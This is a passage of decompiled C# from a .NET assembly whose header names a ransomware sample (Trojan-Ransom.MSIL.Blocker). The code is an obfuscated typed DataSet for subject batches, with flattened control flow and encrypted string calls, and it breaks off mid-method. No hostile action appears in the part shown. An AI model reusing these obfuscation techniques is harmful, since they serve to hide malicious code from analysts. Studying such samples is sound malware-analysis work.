// Decompiled with JetBrains decompiler
// Type: Gr90.b0M4
// Assembly: Po0, Version=1.0.7962.23557, Culture=neutral, PublicKeyToken=null
// MVID: 64F19321-F9A8-4C19-950E-E10776B41F0D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-72d0b083aa7fe84ab302b5a1efa6351f891f1e3d2cc164627e9a89f989df3cb3.exe

using Am0a;
using b5E;
using d5L;
using Ef5i;
using f8JT;
using g9B4;
using Gn9;
using Ht8c;
using Jr2;
using Lp6;
using Nc56;
using Sg7;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Data;
using System.Globalization;
using System.IO;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using System.Xml;
using System.Xml.Schema;
using System.Xml.Serialization;
using t2E;
using Tc1;
using x5J6;

namespace Gr90
{
  [XmlSchemaProvider("GetTypedDataSetSchema")]
  [HelpKeyword("vs.data.DataSet")]
  [XmlRoot("dsSubjectBatches")]
  [ToolboxItem(true)]
  [DesignerCategory("code")]
  [Serializable]
  public class b0M4 : DataSet
  {
    private b0M4.d0L4 tableBATCHES;
    private SchemaSerializationMode _schemaSerializationMode;

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    public b0M4()
    {
      this._schemaSerializationMode = SchemaSerializationMode.IncludeSchema;
      this.BeginInit();
      this.o5ZA();
      CollectionChangeEventHandler changeEventHandler = new CollectionChangeEventHandler(this.Qq1s);
      y4T2.s7XT<DataTableCollection, CollectionChangeEventHandler>(w0DB.Mw68<DataSet>((DataSet) this, (short) 208, 'è'), changeEventHandler, (short) 486, (short) 465);
      w0DB.z0RC<DataSet>((DataSet) this, 'ͳ', (short) 839).CollectionChanged += changeEventHandler;
      this.EndInit();
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    protected b0M4(SerializationInfo info, StreamingContext context)
      : base(info, context, false)
    {
      this._schemaSerializationMode = SchemaSerializationMode.IncludeSchema;
      if (this.IsBinarySerialized(info, context))
      {
        this.Kk29(false);
        CollectionChangeEventHandler changeEventHandler = new CollectionChangeEventHandler(this.Qq1s);
        y4T2.s7XT<DataTableCollection, CollectionChangeEventHandler>(this.Tables, changeEventHandler, (short) 542, (short) 553);
        y4T2.n7D6<DataRelationCollection, CollectionChangeEventHandler>(this.Relations, changeEventHandler, (short) 204, 132);
      }
      else
      {
        string s = e3F.Td3<object>(c8T.m5A<Type, SerializationInfo, string>(info, Cm9.Qj5(6, (byte) 12, 574087238), typeof (string), 228, (short) 204), (short) 56, 'G');
        if (this.DetermineSchemaSerializationMode(info, context) == SchemaSerializationMode.IncludeSchema)
        {
          DataSet dataSet = new DataSet();
          Pa8.z1Y<XmlReader, DataSet>(dataSet, (XmlReader) new XmlTextReader((TextReader) new StringReader(s)), (short) 322, 382);
          if (j6D2.b1Z8<DataTableCollection, string>(w0DB.Mw68<DataSet>(dataSet, (short) 693, 'ʌ'), Cm9.Qj5(5, (byte) 11, 574088046), '˭', 'ˉ') != null)
            w0DB.Jt13<DataTable, DataTableCollection>(w0DB.Mw68<DataSet>((DataSet) this, (short) 842, 'Ͳ'), (DataTable) new b0M4.d0L4(j6D2.b1Z8<DataTableCollection, string>(w0DB.Mw68<DataSet>(dataSet, (short) 246, 'Ï'), Cm9.Qj5(7, (byte) 15, 574088044), '˓', '˷')), 737, 'ʐ');
          f5B.s5T<string, DataSet>((DataSet) this, w0DB.t5RY<DataSet>(dataSet, 868, '̊'), (short) 350, 'Č');
          w0DB.Dq3f<string, DataSet>((DataSet) this, w0DB.t5RY<DataSet>(dataSet, 431, 'ǀ'), (short) 347, 'ž');
          f5B.s5T<string, DataSet>((DataSet) this, j6D2.g3NC<DataSet>(dataSet, 101, (short) 79), (short) 38, 'u');
          this.Locale = j6D2.Sx23<DataSet>(dataSet, 261, 'Ŀ');
          this.CaseSensitive = dataSet.CaseSensitive;
          this.EnforceConstraints = dataSet.EnforceConstraints;
          this.Merge(dataSet, false, MissingSchemaAction.Add);
          this.Kd0p();
        }
        else
          this.ReadXmlSchema((XmlReader) new XmlTextReader((TextReader) new StringReader(s)));
        this.GetSerializationData(info, context);
        CollectionChangeEventHandler changeEventHandler = new CollectionChangeEventHandler(this.Qq1s);
        this.Tables.CollectionChanged += changeEventHandler;
        this.Relations.CollectionChanged += changeEventHandler;
      }
    }

    [Browsable(false)]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    [DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
    public b0M4.d0L4 BATCHES => this.tableBATCHES;

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    [Browsable(true)]
    [DesignerSerializationVisibility(DesignerSerializationVisibility.Visible)]
    public override SchemaSerializationMode SchemaSerializationMode
    {
      get => this._schemaSerializationMode;
      set => this._schemaSerializationMode = value;
    }

    [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    public new DataTableCollection Tables => w0DB.Mw68<DataSet>((DataSet) this, (short) 669, 'ʥ');

    [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    public new DataRelationCollection Relations => w0DB.z0RC<DataSet>((DataSet) this, 'ȼ', (short) 520);

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    protected virtual void De7q()
    {
      this.BeginInit();
      this.o5ZA();
      this.EndInit();
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    public virtual DataSet g5L3()
    {
      int num = 3;
      b0M4 b0M4;
      while (true)
      {
        switch (num)
        {
          case 1:
            num = 2;
            continue;
          case 2:
            goto label_5;
          case 4:
            b0M4.Kd0p();
            b0M4.SchemaSerializationMode = this.SchemaSerializationMode;
            goto case 1;
          default:
            b0M4 = (b0M4) this.Clone();
            goto case 4;
        }
      }
label_5:
      return (DataSet) b0M4;
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    protected virtual bool Yp7f() => false;

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    protected virtual bool q6NB() => false;

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    protected virtual void Rw42(XmlReader w8PY)
    {
      char[] v = Sb1p.V;
      int num1 = 1;
      DataSet dataSet;
      bool flag;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 6:
            this.Merge(dataSet, false, MissingSchemaAction.Add);
            this.Kd0p();
            num1 = 12;
            continue;
          case 2:
            w0DB.Jt13<DataTable, DataTableCollection>(w0DB.Mw68<DataSet>((DataSet) this, (short) 278, 'Į'), (DataTable) new b0M4.d0L4(j6D2.b1Z8<DataTableCollection, string>(w0DB.Mw68<DataSet>(dataSet, (short) 997, 'Ϝ'), Cm9.Qj5(3, (byte) 28, 574088040), '¬', '\u0088')), 61, 'L');
            num1 = 5;
            continue;
          case 3:
          case 13:
          case 15:
            this.Namespace = j6D2.g3NC<DataSet>(dataSet, 172, (short) 134);
            this.Locale = dataSet.Locale;
            num1 = 11;
            continue;
          case 4:
            num1 = !flag ? 8 : 2;
            continue;
          case 5:
            num1 = 8;
            continue;
          case 7:
            goto label_15;
          case 8:
            f5B.s5T<string, DataSet>((DataSet) this, w0DB.t5RY<DataSet>(dataSet, 549, 'ɋ'), (short) 1023, 'έ');
            num1 = 9;
            continue;
          case 9:
            w0DB.Dq3f<string, DataSet>((DataSet) this, w0DB.t5RY<DataSet>(dataSet, 461, 'Ƣ'), (short) 834, 'ͧ');
            num1 = 15;
            continue;
          case 10:
            int num2 = (int) this.ReadXml(w8PY);
            this.Kd0p();
            num1 = (int) v[116] - 34238;
            continue;
          case 11:
            this.CaseSensitive = dataSet.CaseSensitive;
            this.EnforceConstraints = dataSet.EnforceConstraints;
            num1 = 0;
            continue;
          case 12:
            num1 = 7;
            continue;
          case 14:
            flag = j6D2.b1Z8<DataTableCollection, string>(w0DB.Mw68<DataSet>(dataSet, (short) 791, '̮'), Cm9.Qj5(1, (byte) 4, 574088042), 'ƃ', 'Ƨ') != null;
            num1 = 4;
            continue;
          case 16:
            c8T.j9G<DataSet>((DataSet) this, 'ł', (short) 292);
            dataSet = new DataSet();
            int num3 = (int) y4T2.Ae4x<DataSet, XmlReader>(dataSet, w8PY, 569, (short) 522);
            num1 = 14;
            continue;
          default:
            num1 = this.DetermineSchemaSerializationMode(w8PY) != SchemaSerializationMode.IncludeSchema ? 10 : 16;
            continue;
        }
      }
label_15:;
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    protected virtual XmlSchema Di10()
    {
      int num = 3;
      MemoryStream memoryStream;
      XmlSchema xmlSchema1;
      while (true)
      {
        switch (num)
        {
          case 0:
            y4T2.m3A0<MemoryStream>(memoryStream, 0L, 'ʶ', (short) 695);
            goto case 2;
          case 1:
            goto label_5;
          case 2:
          case 4:
            xmlSchema1 = XmlSchema.Read((XmlReader) new XmlTextReader((Stream) memoryStream), (ValidationEventHandler) null);
            num = 1;
            continue;
          default:
            memoryStream = new MemoryStream();
            j6D2.j9XR<XmlWriter, DataSet>((DataSet) this, (XmlWriter) new XmlTextWriter((Stream) memoryStream, (Encoding) null), '\u0081', 224);
            num = 0;
            continue;
        }
      }
label_5:
      XmlSchema xmlSchema2 = xmlSchema1;
      Sb1p.V[222] = (char) ((int) Sb1p.V[222] + (int) Sb1p.V[60] & 186);
      return xmlSchema2;
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    internal void Kd0p() => this.Kk29(true);

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    internal void Kk29(bool j0TR)
    {
      int num = 6;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
            num = this.tableBATCHES == null ? 2 : 8;
            continue;
          case 1:
            num = 3;
            continue;
          case 2:
            num = 5;
            continue;
          case 3:
            flag = j0TR;
            goto case 4;
          case 4:
            num = !flag ? 5 : 0;
            continue;
          case 5:
            goto label_9;
          case 8:
            this.tableBATCHES.Js8w();
            num = 2;
            continue;
          default:
            this.tableBATCHES = (b0M4.d0L4) j6D2.b1Z8<DataTableCollection, string>(w0DB.Mw68<DataSet>((DataSet) this, (short) 624, 'Ɉ'), Cm9.Qj5(5, (byte) 8, 574088046), '\u0097', '\u00B3');
            goto case 1;
        }
      }
label_9:;
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    private void o5ZA()
    {
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            goto label_6;
          case 2:
            w0DB.Dq3f<string, DataSet>((DataSet) this, Cm9.Qj5(8, (byte) 11, 574088069), (short) 1000, 'ύ');
            num = 3;
            continue;
          case 3:
          case 4:
            f5B.s5T<string, DataSet>((DataSet) this, p3P.Ay5((p3P) null, 6, 850351399), (short) 237, '\u00BE');
            num = 7;
            continue;
          case 6:
          case 7:
            e3F.w9P<DataSet>((DataSet) this, true, (short) 889, '̱');
            this.SchemaSerializationMode = SchemaSerializationMode.IncludeSchema;
            num = 1;
            continue;
          default:
            f5B.s5T<string, DataSet>((DataSet) this, Cm9.Qj5(2, (byte) 3, 574087351), (short) 634, 'Ȩ');
            num = 2;
            continue;
        }
      }
label_6:
      this.tableBATCHES = new b0M4.d0L4();
      this.Tables.Add((DataTable) this.tableBATCHES);
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    private bool r0Q3() => false;

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    private void Qq1s(object c5J3, CollectionChangeEventArgs Gw7y)
    {
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_5;
          case 2:
          case 5:
            num = 4;
            continue;
          case 3:
            this.Kd0p();
            goto case 2;
          case 4:
            goto label_6;
          default:
            num = Cm9.z6J<CollectionChangeEventArgs>(Gw7y, (short) 317, (short) 312) != CollectionChangeAction.Remove ? 4 : 3;
            continue;
        }
      }
label_5:
      return;
label_6:;
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    public static XmlSchemaComplexType a0FE(XmlSchemaSet Rf6t)
    {
      int[] y = f7Y9.Y;
      int num1 = 1;
      b0M4 b0M4;
      XmlSchemaComplexType schemaComplexType1;
      XmlSchemaSequence xmlSchemaSequence;
      XmlSchemaAny xmlSchemaAny;
      XmlSchema schema;
      bool flag1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            Pa8.a8L<XmlSchemaComplexType, XmlSchemaParticle>(schemaComplexType1, (XmlSchemaParticle) xmlSchemaSequence, (short) 2, '_');
            schema = b0M4.Di10();
            num1 = 6;
            continue;
          case 2:
            Cm9.Yp6<XmlSchemaObjectCollection, XmlSchemaObject>(Yc9.y8F<XmlSchemaSequence>(xmlSchemaSequence, 249, (short) 251), (XmlSchemaObject) xmlSchemaAny, '͉', 886);
            goto case 4;
          case 3:
            num1 = 8;
            continue;
          case 4:
            num1 = 0;
            continue;
          case 6:
            flag1 = f5B.Ta3<string, XmlSchemaSet>(Rf6t, Yc9.Mf3<XmlSchema>(schema, '̴', 'ͱ'), '̂', 779);
            goto case 3;
          case 7:
            goto label_10;
          case 8:
            if (flag1)
            {
              num1 = 7;
              continue;
            }
            goto label_43;
          default:
            b0M4 = new b0M4();
            schemaComplexType1 = new XmlSchemaComplexType();
            xmlSchemaSequence = new XmlSchemaSequence();
            xmlSchemaAny = new XmlSchemaAny();
            Yc9.Lf4<XmlSchemaAny, string>(xmlSchemaAny, j6D2.g3NC<DataSet>((DataSet) b0M4, 1003, (short) 961), (short) 715, 662);
            num1 = 2;
            continue;
        }
      }
label_10:
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2 = new MemoryStream();
      XmlSchemaComplexType schemaComplexType2;
      try
      {
        int num2 = 7;
        while (true)
        {
          XmlSchema xmlSchema;
          IEnumerator enumerator;
          bool flag2;
          int num3;
          switch (num2)
          {
            case 0:
              enumerator = y4T2.Sm24<XmlSchemaSet, string>(Rf6t, Yc9.Mf3<XmlSchema>(schema, 'ă', 'ņ'), 'ƺ', 'Ɯ').GetEnumerator();
              num2 = 13;
              continue;
            case 1:
              num2 = !flag2 ? 14 : 15;
              continue;
            case 2:
              xmlSchema = (XmlSchema) enumerator.Current;
              y4T2.m3A0<MemoryStream>(memoryStream2, 0L, 'ɂ', (short) 578);
              num2 = 12;
              continue;
            case 3:
              num2 = 17;
              continue;
            case 4:
              num3 = p3P.Cm6<MemoryStream>(memoryStream1, (short) 617, 'ȃ') == p3P.Cm6<MemoryStream>(memoryStream2, (short) 534, 'ɼ') ? 1 : 0;
              break;
            case 6:
            case 18:
              goto label_40;
            case 8:
            case 9:
              num2 = 14;
              continue;
            case 10:
              goto label_27;
            case 11:
              flag2 = Cm9.Yp1<MemoryStream>(memoryStream1, (short) 573, 'Ȱ') == Cm9.Yp1<MemoryStream>(memoryStream2, (short) 19, '\u001E');
              num2 = 1;
              continue;
            case 12:
              n8F.Yy6<XmlSchema, Stream>(xmlSchema, (Stream) memoryStream2, '\u0380', (short) 917);
              goto case 11;
            case 13:
              num2 = enumerator.MoveNext() ? 2 : 6;
              continue;
            case 14:
              num2 = 13;
              continue;
            case 15:
              y4T2.m3A0<MemoryStream>(memoryStream1, 0L, 'Ŕ', (short) 341);
              y4T2.m3A0<MemoryStream>(memoryStream2, 0L, '̽', (short) 828);
              num2 = 20;
              continue;
            case 16:
              num3 = 0;
              break;
            case 17:
              num2 = Cm9.Yp1<MemoryStream>(memoryStream1, (short) 775, '̉') == Cm9.Yp1<MemoryStream>(memoryStream1, (short) 428, 'ơ') ? 16 : 4;
              continue;
            case 19:
              num2 = memoryStream1.Position != memoryStream1.Length ? 8 : 10;
              continue;
            case 20:
              num2 = 17;
              continue;
            default:
              xmlSchema = (XmlSchema) null;
              n8F.Yy6<XmlSchema, Stream>(schema, (Stream) memoryStream1, 'ͪ', (short) 895);
              num2 = 0;
              continue;
          }
          num2 = num3 != 0 ? 3 : 19;
        }
label_27:
        schemaComplexType2 = schemaComplexType1;
        goto label_44;
      }
      finally
      {
        int num4 = 8;
        while (true)
        {
          switch (num4)
          {
            case 0:
              goto label_39;
            case 1:
              num4 = 0;
              continue;
            case 2:
            case 6:
              num4 = memoryStream2 == null ? 0 : 3;
              continue;
            case 3:
              memoryStream2.Close();
              goto case 1;
            case 4:
              memoryStream1.Close();
              goto case 5;
            case 5:
              num4 = 6;
              continue;
            default:
              num4 = memoryStream1 == null ? 6 : 4;
              continue;
          }
        }
label_39:;
      }
label_40:
      int num5 = 5;
label_41:
      while (true)
      {
        switch (num5)
        {
          case 0:
          case 4:
            goto label_44;
          case 1:
            goto label_43;
          default:
            num5 = 1;
            continue;
        }
      }
label_43:
      Rf6t.Add(schema);
      schemaComplexType2 = schemaComplexType1;
      int num6 = y[459];
      f7Y9.Y[200] = (f7Y9.Y[200] ^ f7Y9.Y[216]) & 131;
      num5 = num6 - 64316;
      goto label_41;
label_44:
      return schemaComplexType2;
    }

    [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
    public delegate void y3N1(object sender, b0M4.e8RK e);

    [XmlSchemaProvider("GetTypedTableSchema")]
    [Serializable]
    public class d0L4 : TypedTableBase<b0M4.Fg3o>
    {
      private DataColumn columnSUBJECT;
      private DataColumn columnNOBATCHES;
      private b0M4.y3N1 BATCHESRowChangingEvent;
      private b0M4.y3N1 BATCHESRowChangedEvent;
      private b0M4.y3N1 BATCHESRowDeletingEvent;
      private b0M4.y3N1 BATCHESRowDeletedEvent;

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public d0L4()
      {
        Pa8.Bp1<DataTable, string>((DataTable) this, Cm9.Qj5(4, (byte) 28, 574088047), 1007, 952);
        e3F.e6P<DataTable>((DataTable) this, 'Ƙ', (short) 405);
        this.Ha78();
        this.EndInit();
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      internal d0L4(DataTable table)
      {
        Pa8.Bp1<DataTable, string>((DataTable) this, f5B.a6X<DataTable>(table, 480, (short) 488), 680, 767);
        if (Qx0y.Ac6a<DataTable>(table, 'ƍ', 457) != e3F.Ec6<DataSet>(He52.Hn09<DataTable>(table, (short) 756, (short) 728), 500, 451))
          n8F.q9D<DataTable>((DataTable) this, Qx0y.Ac6a<DataTable>(table, 'Ğ', 346), 'ë', 'À');
        if (w0DB.c6BC<string, string>(w0DB.Ma89<CultureInfo>(e3F.Xi4<DataTable>(table, 'ŝ', 300), 871, 879), w0DB.Ma89<CultureInfo>(j6D2.Sx23<DataSet>(He52.Hn09<DataTable>(table, (short) 371, (short) 351), 506, 'ǀ'), 459, 451), false, 795, 823) != 0)
          this.Locale = table.Locale;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
          this.Namespace = table.Namespace;
        this.Prefix = table.Prefix;
        this.MinimumCapacity = table.MinimumCapacity;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected d0L4(SerializationInfo info, StreamingContext context)
        : base(info, context)
      {
        this.Js8w();
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public DataColumn SUBJECTColumn => this.columnSUBJECT;

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public DataColumn NOBATCHESColumn => this.columnNOBATCHES;

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      [Browsable(false)]
      public int Count
      {
        get
        {
          int num1 = 2;
          int num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
                num1 = 1;
                continue;
              case 1:
              case 3:
                goto label_4;
              default:
                num2 = w0DB.Ft9w<DataRowCollection>(n8F.p0P<DataTable>((DataTable) this, '\u0018', (short) 71), '6', 102);
                goto case 0;
            }
          }
label_4:
          return num2;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public b0M4.Fg3o this[int Rw3f]
      {
        get
        {
          int num = 3;
          b0M4.Fg3o fg3o;
          while (true)
          {
            switch (num)
            {
              case 1:
              case 2:
                goto label_3;
              default:
                fg3o = (b0M4.Fg3o) n8F.k1L<DataRowCollection>(n8F.p0P<DataTable>((DataTable) this, 'ǋ', (short) 404), Rw3f, 'µ', 'ó');
                num = 1;
                continue;
            }
          }
label_3:
          return fg3o;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public event b0M4.y3N1 BATCHESRowChanging
      {
        add
        {
          int num = 2;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 0:
              case 6:
                comparand = y3N1_1;
                goto case 4;
              case 1:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowChangingEvent, y3N1_2, comparand);
                goto case 5;
              case 3:
                goto label_7;
              case 4:
                y3N1_2 = (b0M4.y3N1) y4T2.Jg1k<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 569, 'ɵ');
                num = 1;
                continue;
              case 5:
                num = y3N1_1 != comparand ? 0 : 3;
                continue;
              default:
                y3N1_1 = this.BATCHESRowChangingEvent;
                num = 0;
                continue;
            }
          }
label_7:;
        }
        remove
        {
          int num = 6;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 0:
                goto label_6;
              case 1:
              case 4:
                num = y3N1_1 != comparand ? 5 : 0;
                continue;
              case 2:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowChangingEvent, y3N1_2, comparand);
                goto case 1;
              case 5:
                comparand = y3N1_1;
                y3N1_2 = (b0M4.y3N1) Qx0y.i6H4<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 325, 'İ');
                num = 2;
                continue;
              default:
                y3N1_1 = this.BATCHESRowChangingEvent;
                num = 5;
                continue;
            }
          }
label_6:;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public event b0M4.y3N1 BATCHESRowChanged
      {
        add
        {
          int num = 3;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 0:
                y3N1_2 = (b0M4.y3N1) y4T2.Jg1k<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 483, 'Ư');
                num = 5;
                continue;
              case 1:
              case 5:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowChangedEvent, y3N1_2, comparand);
                num = y3N1_1 != comparand ? 6 : 2;
                continue;
              case 2:
                goto label_6;
              case 4:
                goto label_7;
              case 6:
                comparand = y3N1_1;
                goto case 0;
              default:
                y3N1_1 = this.BATCHESRowChangedEvent;
                num = 6;
                continue;
            }
          }
label_6:
          return;
label_7:;
        }
        remove
        {
          char[] v = Sb1p.V;
          int num = 3;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 0:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowChangedEvent, y3N1_2, comparand);
                num = y3N1_1 != comparand ? 1 : 4;
                continue;
              case 1:
                comparand = y3N1_1;
                goto case 5;
              case 4:
                goto label_6;
              case 5:
              case 6:
                y3N1_2 = (b0M4.y3N1) Qx0y.i6H4<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 49, 'D');
                num = (int) v[257] - (int) v[257];
                continue;
              default:
                y3N1_1 = this.BATCHESRowChangedEvent;
                num = 1;
                continue;
            }
          }
label_6:;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public event b0M4.y3N1 BATCHESRowDeleting
      {
        add
        {
          int num = 6;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 0:
                y3N1_2 = (b0M4.y3N1) y4T2.Jg1k<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 367, 'ģ');
                num = 2;
                continue;
              case 1:
              case 2:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowDeletingEvent, y3N1_2, comparand);
                num = y3N1_1 != comparand ? 3 : 5;
                continue;
              case 3:
                comparand = y3N1_1;
                goto case 0;
              case 5:
                goto label_6;
              default:
                y3N1_1 = this.BATCHESRowDeletingEvent;
                num = 3;
                continue;
            }
          }
label_6:;
        }
        remove
        {
          int num = 4;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 0:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowDeletingEvent, y3N1_2, comparand);
                num = y3N1_1 != comparand ? 5 : 2;
                continue;
              case 1:
              case 3:
                num = 0;
                continue;
              case 2:
                goto label_6;
              case 5:
                comparand = y3N1_1;
                y3N1_2 = (b0M4.y3N1) Qx0y.i6H4<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 446, 'ǋ');
                goto case 1;
              case 6:
                goto label_7;
              default:
                y3N1_1 = this.BATCHESRowDeletingEvent;
                num = 5;
                continue;
            }
          }
label_6:
          return;
label_7:;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public event b0M4.y3N1 BATCHESRowDeleted
      {
        add
        {
          int num = 0;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 1:
                y3N1_2 = (b0M4.y3N1) y4T2.Jg1k<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 827, 'ͷ');
                num = 2;
                continue;
              case 2:
              case 4:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowDeletedEvent, y3N1_2, comparand);
                num = y3N1_1 != comparand ? 3 : 6;
                continue;
              case 3:
                comparand = y3N1_1;
                goto case 1;
              case 6:
                goto label_6;
              default:
                y3N1_1 = this.BATCHESRowDeletedEvent;
                num = 3;
                continue;
            }
          }
label_6:;
        }
        remove
        {
          int num = 1;
          b0M4.y3N1 y3N1_1;
          b0M4.y3N1 comparand;
          b0M4.y3N1 y3N1_2;
          while (true)
          {
            switch (num)
            {
              case 0:
              case 2:
                comparand = y3N1_1;
                y3N1_2 = (b0M4.y3N1) Qx0y.i6H4<Delegate, Delegate>((Delegate) comparand, (Delegate) value, 825, '͌');
                goto case 4;
              case 3:
                goto label_6;
              case 4:
              case 5:
                num = 6;
                continue;
              case 6:
                y3N1_1 = Interlocked.CompareExchange<b0M4.y3N1>(ref this.BATCHESRowDeletedEvent, y3N1_2, comparand);
                num = y3N1_1 != comparand ? 0 : 3;
                continue;
              default:
                y3N1_1 = this.BATCHESRowDeletedEvent;
                num = 0;
                continue;
            }
          }
label_6:;
        }
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public void q3NJ(b0M4.Fg3o Ei3p) => n8F.p0P<DataTable>((DataTable) this, '̅', (short) 858).Add((DataRow) Ei3p);

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public b0M4.Fg3o Xt2n(string Sr8q, Decimal i0ZK)
      {
        int num = 5;
        b0M4.Fg3o row;
        object[] objArray;
        while (true)
        {
          switch (num)
          {
            case 1:
            case 3:
              goto label_5;
            case 2:
              y4T2.s3RA<DataRow>((DataRow) row, objArray, 'Ń', 298);
              n8F.p0P<DataTable>((DataTable) this, 'Ώ', (short) 976).Add((DataRow) row);
              num = 1;
              continue;
            case 4:
              num = 2;
              continue;
            default:
              row = (b0M4.Fg3o) Yc9.Yd5<DataTable>((DataTable) this, 'Ĕ', 266);
              objArray = new object[2]
              {
                (object) Sr8q,
                (object) i0ZK
              };
              goto case 4;
          }
        }
label_5:
        return row;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      public virtual DataTable Mc2k()
      {
        int num = 4;
        b0M4.d0L4 d0L4;
        DataTable dataTable;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 3:
              goto label_4;
            case 1:
              dataTable = (DataTable) d0L4;
              num = 0;
              continue;
            default:
              d0L4 = (b0M4.d0L4) this.Clone();
              d0L4.Js8w();
              goto case 1;
          }
        }
label_4:
        return dataTable;
      }

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      protected virtual DataTable Yk17() => (DataTable) new b0M4.d0L4();

      [GeneratedCode("System.Data.Design.TypedDataSetGenerator", "16.0.0.0")]
      internal void Js8w()
      {
        int num = 1;
        while (true)
        {
          switch (num)
          {
            case 3:
              goto label_3;
            default:
              this.columnSUBJECT = p3P.Ls5<DataColumnCollection, string>(j6D2.t2JS<DataTable>((DataTable) this, 'Ů', 'ŷ'), p3P.Ay5((p3P) null, 4, 850350163), 'ǫ', (short) 510);
              num = 3;
              continue;
          }
        }
label_3:
